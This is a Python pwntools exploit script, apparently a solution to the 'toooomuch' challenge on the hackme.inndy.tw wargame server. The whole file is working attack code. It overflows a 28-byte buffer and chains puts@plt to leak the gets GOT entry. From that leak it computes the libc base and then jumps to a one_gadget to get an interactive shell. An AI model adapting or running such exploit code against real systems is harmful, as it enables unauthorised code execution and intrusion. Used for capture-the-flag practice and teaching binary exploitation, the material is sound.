#!/usr/bin/env python3
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

libc = ELF("../libc-2.23.so.i386")

r = remote("hackme.inndy.tw", 7702)
#r = process("./toooomuch", env = {"LD_PRELOAD": "../libc-2.23.so.i386"})
#gdb.attach(proc.pidof(r)[0])

gets_got = 0x8049bf4
puts_plt = 0x80484b0
main_address = 0x80487d9
one_gadget = 0x3ac3c

r.sendlineafter("Give me your passcode: ", b'A' * 28 + flat([puts_plt, main_address, gets_got]))
print(r.recvline())
libc.address = u32(r.recv()[:4]) - libc.symbols[b"gets"]
print("libc base address:", hex(libc.address))

r.sendline(b'A' * 28 + flat([libc.address + one_gadget]))

r.interactive()
